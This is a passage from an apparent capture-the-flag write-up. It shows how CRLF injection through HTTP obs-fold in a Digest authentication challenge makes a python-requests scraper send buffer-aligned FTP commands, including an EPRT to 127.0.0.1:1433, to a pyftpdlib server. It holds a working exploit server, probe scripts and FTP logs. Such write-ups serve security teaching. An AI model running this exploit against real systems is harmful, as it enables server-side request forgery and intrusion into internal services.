+<p>Just as we thought, we get a decent amount of control over the <code>digest-response</code> fields sent by the scraper. However, if we try to inject a newline into the <code>username</code> field, python requests throws an error before the request is sent.</p>
+<pre class="language-python"><code class="language-python">ValueError<span class="token punctuation">:</span> Invalid header value <span class="token string">b'Digest username="te\nst", realm="test", nonce="testing", uri="/", response="3bfdf81df12ee34f5b294043ced69684"'</span></code></pre>
+<p>Similarly, if we try to add a newline into the <code>realm</code> or <code>nonce</code> fields we send in our <code>digest-challenge</code>, python requests fails to parse the HTTP response.</p>
+<pre class="language-python"><code class="language-python">urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>HeaderParsingError<span class="token punctuation">:</span> <span class="token punctuation">[</span>MissingHeaderBodySeparatorDefect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> unparsed data<span class="token punctuation">:</span> <span class="token string">'est", nonce="testing"\r\n\r\n'</span></code></pre>
+<p>This behaviour makes sense, since the ability to inject raw newlines in the clients request would be a security issue in python requests itself. However, there's a quirk of the HTTP specification that we can leverage here to preserve the newline and still have the header be valid. This quirk is known as '<a href="https://www.rfc-editor.org/info/rfc9112/#section-5.2">obsolete line folding</a>' (<code>obs-fold</code>), which allows HTTP headers to extend over multiple lines, as long as each line is prepended with a space or horizontal tab. We can modify our web server to implement this for the <code>realm</code> field, and see if it works.</p>
+<pre class="language-python"><code class="language-python">self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"WWW-Authenticate"</span><span class="token punctuation">,</span> <span class="token string">'Digest realm="\n test\n ", nonce="testing"'</span><span class="token punctuation">)</span></code></pre>
+<pre class="language-sh"><code class="language-sh"><span class="token number">172.18</span>.0.2 - - <span class="token punctuation">[</span>04/Sep/2026 <span class="token number">17</span>:46:12<span class="token punctuation">]</span> <span class="token string">"GET / HTTP/1.1"</span> <span class="token number">401</span> -
+Host: <span class="token number">198.0</span>.2.1:8000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Authorization: Digest <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">"test"</span>, <span class="token assign-left variable">realm</span><span class="token operator">=</span><span class="token string">"
+ test
+ "</span>, <span class="token assign-left variable">nonce</span><span class="token operator">=</span><span class="token string">"testing"</span>, <span class="token assign-left variable">uri</span><span class="token operator">=</span><span class="token string">"/"</span>, <span class="token assign-left variable">response</span><span class="token operator">=</span><span class="token string">"c8890b3ab3624caf41836ef16d0b764d"</span></code></pre>
+<p>Nice! We have our CRLF injection, but there's one more problem. The prepended space means that any injected FTP command will be invalid, since FTP typically requires the command to match exactly with what it expects. To figure out if there might be a way around this, we can read the source code of the <code>pyftpdlib</code> FTP server. Pretty quickly, we can find the class that handles the connection and our input. Notably, it defines the incoming data buffer to have a size of <code>65536</code>.</p>
+<h4><code>pyftpdlib/handlers/ftp/data.py</code></h4>
+<pre class="language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DTPHandler</span><span class="token punctuation">(</span>AsyncChat<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Class handling server-data-transfer-process (server-DTP, see
+    RFC-959) managing data-transfer operations involving sending
+    and receiving data.
+
+    Class attributes:
+    [...snip...]
+     - (int) ac_in_buffer_size: incoming data buffer size (defaults 65536)
+
+     - (int) ac_out_buffer_size: outgoing data buffer size (defaults 65536)
+    """</span>
+
+    timeout <span class="token operator">=</span> <span class="token number">300</span>
+    ac_in_buffer_size <span class="token operator">=</span> <span class="token number">65536</span> <span class="token comment"># here</span>
+    ac_out_buffer_size <span class="token operator">=</span> <span class="token number">65536</span></code></pre>
+<p>What happens if our command fills this buffer? A natural guess would be that the remaining data is either discarded, or processed separately. We can test this with a simple script.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> remote<span class="token punctuation">,</span> cyclic
+<span class="token keyword">import</span> time
+
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"USER anonymous\r"</span><span class="token punctuation">)</span>
+time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"PASS n\r"</span><span class="token punctuation">)</span>
+time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b" "</span> <span class="token operator">+</span> cyclic<span class="token punctuation">(</span><span class="token number">65535</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"LIST\r\n"</span><span class="token punctuation">)</span></code></pre>
+<p>This results in the following FTP logs.</p>
+<pre class="language-python"><code class="language-python"><span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">54132</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> FTP session opened <span class="token punctuation">(</span>connect<span class="token punctuation">)</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">54132</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">220</span> pyftpdlib <span class="token number">2.2</span><span class="token number">.0</span> ready<span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">54132</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> USER anonymous
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">54132</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">331</span> Username ok<span class="token punctuation">,</span> send password<span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">54132</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> PASS <span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">54132</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">230</span> Login successful<span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">54132</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> USER <span class="token string">'anonymous'</span> logged <span class="token keyword">in</span><span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">54132</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command too <span class="token builtin">long</span><span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">54132</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command too <span class="token builtin">long</span><span class="token punctuation">.</span></code></pre>
+<p>It didn't seem to work, but notice that there were TWO 'Command too long' errors. This means the buffer did fill up, reset, and process the remaining data separately, but not at the boundary we expected. I'm not sure exactly why this is the case, but we can just adjust our offset until it works. In this case, the correct offset was <code>43439</code>.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> remote<span class="token punctuation">,</span> cyclic
+<span class="token keyword">import</span> time
+
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"USER anonymous\r"</span><span class="token punctuation">)</span>
+time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"PASS n\r"</span><span class="token punctuation">)</span>
+time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b" "</span> <span class="token operator">+</span> cyclic<span class="token punctuation">(</span><span class="token number">43439</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"LIST\r\n"</span><span class="token punctuation">)</span></code></pre>
+<pre class="language-python"><code class="language-python"><span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> FTP session opened <span class="token punctuation">(</span>connect<span class="token punctuation">)</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">220</span> pyftpdlib <span class="token number">2.2</span><span class="token number">.0</span> ready<span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> USER anonymous
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">331</span> Username ok<span class="token punctuation">,</span> send password<span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> PASS <span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">230</span> Login successful<span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> USER <span class="token string">'anonymous'</span> logged <span class="token keyword">in</span><span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command too <span class="token builtin">long</span><span class="token punctuation">.</span>
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> LIST
+<span class="token number">172.18</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">56816</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">150</span> File status okay<span class="token punctuation">.</span> About to <span class="token builtin">open</span> data connection<span class="token punctuation">.</span></code></pre>
+<p>Things get a little more complicated when we consider that we need to do this for a total of 6 FTP commands. This means we're going to need a solid understanding of how the buffer is being handled, and how we can ensure that every FTP command lands on the boundary.</p>
+<p>While reading the implementation of the FTP handler, we come across the <code>collect_incoming_data()</code> function, which is what caused the '500 Command too long.' error we saw earlier.</p>
+<h4><code>pyftpdlib/handlers/ftp/control.py</code></h4>
+<pre class="language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">collect_incoming_data</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""Read incoming data and append to the input buffer."""</span>
+        self<span class="token punctuation">.</span>_in_buffer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>_in_buffer_len <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+        <span class="token comment"># Flush buffer if it gets too long (possible DoS attacks).</span>
+        <span class="token comment"># RFC-959 specifies that a 500 response could be given in</span>
+        <span class="token comment"># such cases</span>
+        buflimit <span class="token operator">=</span> <span class="token number">2048</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_in_buffer_len <span class="token operator">></span> buflimit<span class="token punctuation">:</span>
+            self<span class="token punctuation">.</span>respond_w_warning<span class="token punctuation">(</span><span class="token string">"500 Command too long."</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>_in_buffer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+            self<span class="token punctuation">.</span>_in_buffer_len <span class="token operator">=</span> <span class="token number">0</span></code></pre>
+<p>Based on this function, it seems like each command must fit within <code>2048</code> bytes, otherwise it is discarded entirely. To confirm our understanding, we can look at where <code>collect_incoming_data()</code> is called.</p>
+<h4><code>asynchat/__init__.py</code> (remote repository, base implementation of a class that FTPHandler inherits from)</h4>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">handle_read</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+   <span class="token keyword">try</span><span class="token punctuation">:</span>
+       data <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ac_in_buffer_size<span class="token punctuation">)</span> <span class="token comment"># self.ac_in_buffer = 65536</span>
+   <span class="token keyword">except</span> BlockingIOError<span class="token punctuation">:</span>
+       <span class="token keyword">return</span>
+
+   <span class="token comment"># ...snip...</span>
+   self<span class="token punctuation">.</span>ac_in_buffer <span class="token operator">=</span> self<span class="token punctuation">.</span>ac_in_buffer <span class="token operator">+</span> data
+   <span class="token comment"># ...snip...</span>
+   <span class="token keyword">while</span> self<span class="token punctuation">.</span>ac_in_buffer<span class="token punctuation">:</span>
+        lb <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ac_in_buffer<span class="token punctuation">)</span>
+        terminator <span class="token operator">=</span> self<span class="token punctuation">.</span>get_terminator<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> terminator<span class="token punctuation">:</span>
+            <span class="token comment"># no terminator, collect it all</span>
+            <span class="token comment"># ...snip...</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token comment"># 3 cases:</span>
+            <span class="token comment"># 1) end of buffer matches terminator exactly:</span>
+            <span class="token comment">#    collect data, transition</span>
+            <span class="token comment"># 2) end of buffer matches some prefix:</span>
+            <span class="token comment">#    collect data to the prefix</span>
+            <span class="token comment"># 3) end of buffer does not match any prefix:</span>
+            <span class="token comment">#    collect data</span>
+            terminator_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>terminator<span class="token punctuation">)</span>
+            index <span class="token operator">=</span> self<span class="token punctuation">.</span>ac_in_buffer<span class="token punctuation">.</span>find<span class="token punctuation">(</span>terminator<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> index <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+                <span class="token comment"># we found the terminator</span>
+                <span class="token comment"># ...snip...</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token comment"># check for a prefix of the terminator</span>
+                index <span class="token operator">=</span> find_prefix_at_end<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ac_in_buffer<span class="token punctuation">,</span> terminator<span class="token punctuation">)</span>
+                <span class="token keyword">if</span> index<span class="token punctuation">:</span>
+                    <span class="token keyword">if</span> index <span class="token operator">!=</span> lb<span class="token punctuation">:</span>
+                        <span class="token comment"># we found a prefix, collect up to the prefix</span>
+                        self<span class="token punctuation">.</span>collect_incoming_data<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ac_in_buffer<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>
+                        self<span class="token punctuation">.</span>ac_in_buffer <span class="token operator">=</span> self<span class="token punctuation">.</span>ac_in_buffer<span class="token punctuation">[</span><span class="token operator">-</span>index<span class="token punctuation">:</span><span class="token punctuation">]</span>
+                    <span class="token keyword">break</span>
+                <span class="token keyword">else</span><span class="token punctuation">:</span>
+                    <span class="token comment"># no prefix, collect it all</span>
+                    self<span class="token punctuation">.</span>collect_incoming_data<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ac_in_buffer<span class="token punctuation">)</span>
+                    self<span class="token punctuation">.</span>ac_in_buffer <span class="token operator">=</span> <span class="token string">b''</span></code></pre>
+<p>The important parts here are that:</p>
+<ol>
+<li>When data is read, <code>recv(65536)</code> is called, reading <code>65536</code> bytes.</li>
+<li>The function then looks for a terminator, which is <code>\r\n</code> in this case.</li>
+<li>If a terminator is found, the data up until the terminator is passed to <code>collect_incoming_data</code>.</li>
+<li>Any data that followed the terminator is proccessed again from step 2.</li>
+</ol>
+<p>With this information, consider the following data sent to the FTP server.</p>
+<pre class="language-python"><code class="language-python"><span class="token operator">&lt;</span><span class="token number">65536</span> <span class="token builtin">bytes</span> of junk<span class="token operator">></span>USER anonymous\r\n<span class="token operator">&lt;</span><span class="token number">65536</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">'USER anonymous'</span><span class="token punctuation">)</span> <span class="token builtin">bytes</span> of junk<span class="token operator">></span>PASS anonymous\r\n</code></pre>
+<p>As long as the bytes of junk do not contain the <code>\r\n</code> terminator, the flow of this data should look something like:</p>
+<pre class="language-python"><code class="language-python">data <span class="token operator">=</span> recv<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span> <span class="token comment"># gets &lt;65536 bytes of junk></span>
+self<span class="token punctuation">.</span>collect_incoming_data<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token comment"># command too long! Discard all the data</span>
+data <span class="token operator">=</span> recv<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span> <span class="token comment"># gets USER anonymous\r\n&lt;bytes of junk up until 65536></span>
+self<span class="token punctuation">.</span>collect_incoming_data<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token comment"># reads up until \r\n and processes 'USER anonymous'. Then, reads the remaining bytes of junk and triggers 'command too long!', causing it to be discarded.</span>
+data <span class="token operator">=</span> recv<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span> <span class="token comment"># gets PASS anonymous\r\n</span>
+self<span class="token punctuation">.</span>collect_incoming_data<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token comment"># reads up until \r\n and processes 'PASS anonymous'.</span></code></pre>
+<p>This allows us to consistently run valid FTP commands, as long as the command is aligned at the boundary of data retrieved by <code>recv()</code>. In practice, the <code>recv()</code> boundaries are inconsistent. For example, although each call to <code>recv()</code> specifies a size of <code>65536</code> to be read, my local setup would typically follow the below pattern.</p>
+<pre class="language-python"><code class="language-python">recv<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span> <span class="token comment"># retrieves 65400 bytes</span>
+recv<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span> <span class="token comment"># retrieves 65520 bytes</span>
+recv<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span> <span class="token comment"># retrieves 64469 bytes</span>
+recv<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span> <span class="token comment"># retrieves 65528 bytes</span>
+recv<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span> <span class="token comment"># retrieves 29671 bytes</span>
+recv<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span> <span class="token comment"># retrieves 65527 bytes</span></code></pre>
+<p>We'll use these values for the purpose of this writeup, but during the competition, the organisers had ensured that their challenge deployment would always read <code>65536</code> bytes with their <code>recv()</code> calls.</p>
+<p>Regardless, with this information, we can update our web server to implement this idea.</p>
+<pre class="language-python"><code class="language-python">http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>_MAXLINE <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">32</span> <span class="token comment"># prevent the web server from complaining about long headers from the scraper</span>
+crlf <span class="token operator">=</span> <span class="token string">"\r\n "</span>
+newline <span class="token operator">=</span> <span class="token string">"\n "</span>
+buff_sizes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">65400</span><span class="token punctuation">,</span> <span class="token number">65520</span><span class="token punctuation">,</span> <span class="token number">64469</span><span class="token punctuation">,</span> <span class="token number">65528</span><span class="token punctuation">,</span> <span class="token number">29671</span><span class="token punctuation">,</span> <span class="token number">65527</span><span class="token punctuation">]</span>
+ftp_commands <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">"USER anonymous"</span><span class="token punctuation">,</span>
+    <span class="token string">"PASS anonymous"</span><span class="token punctuation">,</span>
+    <span class="token string">"TYPE I"</span><span class="token punctuation">,</span>
+    <span class="token string">"EPRT |1|127.0.0.1|1433|"</span><span class="token punctuation">,</span>
+    <span class="token string">"REST 69"</span><span class="token punctuation">,</span>
+    <span class="token string">"RETR exploit_image.png"</span>
+<span class="token punctuation">]</span>
+
+crlf_formatted_commands <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> index<span class="token punctuation">,</span> command <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ftp_commands<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        padding <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>buff_sizes<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>newline<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># -49 for all the stuff that came before this</span>
+        crlf_formatted_commands<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n </span><span class="token interpolation"><span class="token punctuation">{</span>padding<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        crlf_formatted_commands<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n </span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">\r\n"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ftp_commands<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        padding <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>buff_sizes<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>crlf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        crlf_formatted_commands<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f" </span><span class="token interpolation"><span class="token punctuation">{</span>padding<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        crlf_formatted_commands<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n </span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">\r\n "</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        padding <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>buff_sizes<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>crlf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        crlf_formatted_commands<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f" </span><span class="token interpolation"><span class="token punctuation">{</span>padding<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        crlf_formatted_commands<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n </span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">\r\n"</span></span><span class="token punctuation">)</span>
+
+junk_padding <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    junk_padding<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\r\n </span><span class="token interpolation"><span class="token punctuation">{</span>cyclic<span class="token punctuation">(</span><span class="token number">65000</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Handler</span><span class="token punctuation">(</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>protocol_version<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">,</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"WWW-Authenticate"</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'digest realm="</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>crlf_formatted_commands<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"basic"</span><span class="token punctuation">,</span> <span class="token string">"b4sic"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">", nonce="testing</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>junk_padding<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"basic"</span><span class="token punctuation">,</span><span class="token string">"b4sic"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'198.0.2.1'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span>
+http <span class="token operator">=</span> HTTPServer<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> Handler<span class="token punctuation">)</span>
+http<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>Note that the script also appends a lot of <code>junk_padding</code> into the <code>nonce</code> field following the <code>realm</code>. This is necessary in order to keep the connection open between python requests and the FTP server, since python requests would terminate the connection before the FTP commands finish processing.</p>
+<p>Running our exploit now using this updated web server now produces the below FTP logs.</p>
+<pre class="language-python"><code class="language-python"><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> FTP session opened <span class="token punctuation">(</span>connect<span class="token punctuation">)</span>
